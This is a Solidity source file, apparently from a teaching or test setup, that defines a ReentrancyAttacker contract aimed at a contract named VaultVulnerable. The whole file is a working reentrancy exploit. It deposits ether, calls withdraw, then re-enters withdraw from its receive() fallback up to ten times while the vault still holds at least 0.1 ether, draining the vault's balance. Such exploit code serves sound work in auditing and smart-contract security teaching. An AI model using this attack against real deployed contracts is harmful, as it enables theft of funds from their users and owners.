// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {VaultVulnerable} from "./Vault.sol";
contract ReentrancyAttacker {
    VaultVulnerable public vault;
    uint256 public count;
    constructor(address v) { vault = VaultVulnerable(v); }
    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }
    receive() external payable {
        if (address(vault).balance >= 0.1 ether && count < 10) {
            unchecked { ++count; }
            vault.withdraw();
        }
    }
}
